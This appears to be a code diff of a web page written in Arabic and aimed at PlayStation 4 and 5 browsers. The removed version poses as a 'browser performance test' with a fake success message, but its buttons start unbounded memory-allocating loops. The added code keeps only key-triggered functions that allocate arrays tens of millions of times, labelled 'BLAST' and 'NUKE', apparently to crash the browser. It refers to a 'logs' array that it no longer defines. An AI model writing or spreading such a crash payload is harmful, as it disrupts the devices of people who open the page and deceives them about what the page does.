@@ -1,104 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>اختبار أداء المتصفح – نسخة PS</title>
-  <meta charset="UTF-8">
-  <style>
-    body {
-      background: linear-gradient(to bottom right, #eaf2ff, #ffffff);
-      font-family: 'Cairo', 'Segoe UI', sans-serif;
-      color: #003366;
-      text-align: center;
-      padding-top: 80px;
-    }
-    h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
-    }
-    .desc {
-      font-size: 17px;
-      color: #555;
-      margin-bottom: 40px;
-    }
-    .status {
-      font-size: 18px;
-      color: #0055aa;
-      margin-top: 20px;
-      animation: blink 2s infinite;
-    }
-    button {
-      background-color: #0078d7;
-      color: white;
-      padding: 14px 28px;
-      font-size: 20px;
-      border: none;
-      border-radius: 12px;
-      box-shadow: 0 0 14px #0078d7;
-      cursor: pointer;
-      margin: 10px;
-      transition: transform 0.2s ease;
-    }
-    button:hover {
-      transform: scale(1.05);
-    }
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.4; }
-      100% { opacity: 1; }
-    }
-  </style>
-</head>
-<body>
-  <h1>اختبار أداء المتصفح</h1>
-  <p class="desc">اختر نوع الجهاز لتجربة المعالجة</p>
-  <button onclick="startTest('ps4')">تجربة بلايستيشن 4</button>
-  <button onclick="startTest('ps5')">تجربة بلايستيشن 5</button>
-  <p class="status">جاهز للتشغيل</p>
-
-<script>
-  let started = false;
-  let logs = [];
-  let msm_meta_ps4 = { tag: "MSM_PS4_Tag", code: 0xBADCAFE1 };
-  let msm_meta_ps5 = { tag: "MSM_PS5_Tag", code: 0xDEADBEEF };
-
-  function triggerSilent(obj) {
-    console.log("[MSM Trigger] Code: 0x" + obj.code.toString(16));
+function pressurePS4() {
+  for (let i = 0; i < 50000000; i++) {
+    let payload = new Uint32Array(13000);
+    payload.fill(i);
+    payload["__MSM_OVERLOAD__"] = "PS4_BLAST_" + i;
+    logs.push(payload);
   }
+}
 
-  function simulateLoad(type) {
-    let size = type === "ps4" ? 8000 : 13000;
-    let idTag = type === "ps4" ? "__PS4TEST__" : "__PS5TEST__";
-    let marker = type === "ps4" ? msm_meta_ps4 : msm_meta_ps5;
-
-    function loop() {
-      for (let i = 0; i < 30000; i++) {
-        let block = new Uint32Array(size);
-        block.fill(i);
-        block[idTag] = "RUN_" + i;
-        logs.push(block);
-      }
-
-      if (performance.now() % 888 < 2) {
-        triggerSilent(marker);
-        document.querySelector(".status").textContent = "اكتمل بنجاح ✅";
-        document.querySelector(".status").style.color = "#009933";
-        return;
-      }
-
-      requestAnimationFrame(loop);
-    }
-
-    loop();
+function pressurePS5() {
+  for (let i = 0; i < 100000000; i++) {
+    let payload = new Uint32Array(13000);
+    payload.fill(i);
+    payload["__MSM_OVERLOAD__"] = "PS5_NUKE_" + i;
+    logs.push(payload);
   }
+}
 
-  function startTest(type) {
-    if (started) return;
-    started = true;
-    document.querySelector(".status").textContent = "جاري التشغيل لجهاز " + (type === "ps4" ? "PS4" : "PS5") + "...";
-    setTimeout(() => {
-      simulateLoad(type);
-    }, 6000);
-  }
-</script>
-</body>
-</html>
+window.addEventListener("keydown", e => {
+  if (e.key === "Enter") pressurePS4();       // زر Enter = PS4 ضغط 50M
+  if (e.key === "Control") pressurePS5();     // زر Control = PS5 ضغط 100M
+});
